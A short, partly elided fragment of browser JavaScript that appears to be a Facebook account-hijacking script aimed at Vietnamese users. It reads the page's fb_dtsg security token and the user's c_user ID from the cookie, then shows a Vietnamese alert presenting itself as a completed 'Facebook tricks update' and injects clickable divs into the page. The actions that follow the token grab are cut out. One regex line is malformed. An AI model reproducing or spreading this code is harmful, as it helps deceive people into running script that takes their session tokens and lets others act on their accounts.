...
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
alert('XONG! NHẤN ENTER ĐỂ HOÀN TẤT QUÁ TRÌNH UPDATE THỦ THUẬT FACEBOOK. CHÚC CÁC BẠN ONLINE VUI VẺ. HTTPS://FACEBOOK.COM');
...
if(body != null) 
{
 ...
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center></center></blink></a>"
...
if(body != null) 
{
 ...
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='Anonymous69()'><center></center></a></a>"
 body.appendChild(div);
